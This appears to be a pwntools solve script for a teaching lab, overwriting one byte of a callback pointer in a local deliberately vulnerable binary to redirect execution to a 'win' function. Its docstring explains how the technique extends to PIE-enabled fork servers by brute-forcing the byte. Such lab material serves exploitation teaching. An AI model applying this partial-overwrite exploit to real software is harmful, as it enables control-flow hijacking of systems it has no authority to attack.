#!/usr/bin/env python3
"""Solve the Ch10 one-byte partial-overwrite lab.

Design:
  - vuln has PIE off, so `default_cb` and `win` have fixed absolute
    addresses discoverable via ELF symbols.
  - The vulnerable read() writes exactly ONE byte past the buffer,
    which lands on the LOW byte of `S.cb`.
  - Because `win` and `default_cb` sit in the same 256-byte window of
    .text (checked by the Makefile), we can steer the callback from
    `default_cb` to `win` by writing a single byte: `win & 0xff`.

The pedagogical point survives when PIE is turned back on: only the
LOW 12 bits of any address inside a code page are frozen; we're using
just 8 of them here.  On a fork-serving target where the return address
lives in the same 256-byte window as `win`, this same script structure
works after brute-forcing the byte value across up to 256 attempts.

Usage:
    ./solve.py               # runs against ./vuln, exits 0 on success
"""
from __future__ import annotations
import os, sys
from pwn import context, ELF, process, log

context.arch = 'amd64'
context.log_level = 'info'

HERE = os.path.dirname(os.path.abspath(__file__))
VULN = os.path.join(HERE, 'vuln')
MARKER = b'CH10_PARTIAL_LANDED_9f2c8a'

def main() -> int:
    elf = ELF(VULN, checksec=False)
    win        = elf.symbols['win']
    default_cb = elf.symbols['default_cb']
    log.info('default_cb = %#x', default_cb)
    log.info('win        = %#x', win)
    if (win & ~0xff) != (default_cb & ~0xff):
        log.failure('layout broken: `win` and `default_cb` are not in the '
                    'same 256-byte window; rebuild and check the Makefile '
                    'layout target.')
        return 2

    payload = b'A' * 64 + bytes([win & 0xff])
    io = process([VULN])
    io.recvuntil(b'input?')
    io.send(payload)
    try:
        data = io.recvall(timeout=3)
    except Exception as e:
        log.failure('recvall failed: %r', e)
        io.close()
        return 3
    io.close()
    if MARKER in data:
        log.success('partial overwrite landed on win()')
        return 0
    log.failure('did not land: %r', data[-120:])
    return 1

if __name__ == '__main__':
    sys.exit(main())
